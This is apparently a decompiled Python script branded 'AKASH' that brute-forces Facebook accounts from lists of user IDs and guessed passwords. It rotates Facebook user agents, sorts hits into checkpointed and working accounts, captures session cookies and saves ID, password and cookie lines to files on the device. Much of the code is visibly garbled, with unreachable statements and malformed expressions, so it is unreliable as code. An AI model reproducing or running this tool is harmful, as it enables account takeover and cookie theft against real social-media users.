...
CON = sol()
ua = [
    'Mozilla/5.0 (Linux; Android 9; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36']
ua = [
...
ua = [
    'Mozilla/5.0 (Linux; Android o; CPH923 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]']
ua = [
...
sys.stdout.write('\x1b[1;37m\x1b]2; AKASH King\x07')
ugen2 = []
ugen = []
cokbrut = []
...
for xd in range(10000):
    ...
    def uaku():
        ...
        for ub in ua:
            ugen.append(ub)
            return None
            a = requests.get('https://github.com/akasonfire/I-AKASH/tree/main').text
            ua = open('.bbnew.txt', 'w')
    ...
    class apvroval:
        ...
        def check():
            url = 'https://github.com/AKASH-King/Public-CloNing-42o/blob/main/Approval.txt'
            import mechanize
            ...
            os.system('xdg-open https://wa.me/+8801851976037')
            time.sleep(59)
            return None
            if Exception:
                e = None
    ...
    if key == 'true':
        ...
        if username == CorrectUsername:
            AKASH('\x1b[10;97m[\x1b[92;1m+\x1b[10;97m] \x1b[10;92mSUCCESSFULLY DONE LOGIN BRO-!тЬЕ')
            time.sleep(1)
            key = 'false'
os.system('clear')
...
def login():
    banner()
    AKASHj('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[1;97m============================================')
    ...
    AKASHj('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[1;97m============================================')
    AKASH = input('\x1b[10;92m\x1b[10;97m[\x1b[10;92m?\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m:\x1b[10;92m ')
    time.sleep(0.01)
    if AKASH in ('m',):
        public()
        return None
...
def crack_file():
    ...
    AKASHj('\x1b[10;97m[\x1b[10;92m?\x1b[10;97m] \x1b[10;91mFile Not Found')
    time.sleep(2)
    back()
    for xid in lin:
        id.append(xid)
...
def passwrd():
    ...
    print('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mAKASH IDz :\x1b[10;97m ' + str(len(id)))
    print('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;94mYOUR OK IDz SAVED\x1b[10;91m : \x1b[10;93m/sdcard/AKASH-Ok.txt')
    ...
    AKASHj('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;96mCLONING COMPLETE BRO')
    AKASHj(f'''\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCOMPLETE YOUR AKASH OK IDz \x1b[10;91m:\x1b[10;92m {h}%s ''' % ok)
    AKASHj('\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]============================================')
...
def crack(idf, pwv):
    ...
    bo = random.choice([
        ...
        u,
        x])
    (sys.stdout.write(f'''\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;97m[{bo}AKASH-XD\x1b[10;97m]\x1b[1;90m>~{P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}-{P}[{h}Ok{P}-{bo}{ok}{P}] '''),)
    sys.stdout.flush()
...
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        ...
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;95m[AKASH-Cp] {idf} | {pw}''')
            os.system('espeak -a 300 " Cp"')
            open('/sdcard/AKASH-Cp-id.txt', 'a').write(idf + ' | ' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1
            ';'.join
...
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            ex = random.choice([
                ...
                u,
                x])
            print(f'''\r\x1b[10;92m[AKASH-Ok💚] {idf} | {pw} \x1b[10;91m:> \x1b[10;96m{AKASHx(idf)}\n\x1b[10;93m[🌺] = COOKIES\x1b[10;91m : \x1b[10;94m{kuki}''')
            linex()
            os.system('espeak -a 300 " AKASH,  Ok,  id"')
            open('/sdcard/AKASH-Ok-id.txt', 'a').write(idf + ' | ' + pw + '\n[COOKIES] = ' + kuki + '\n')
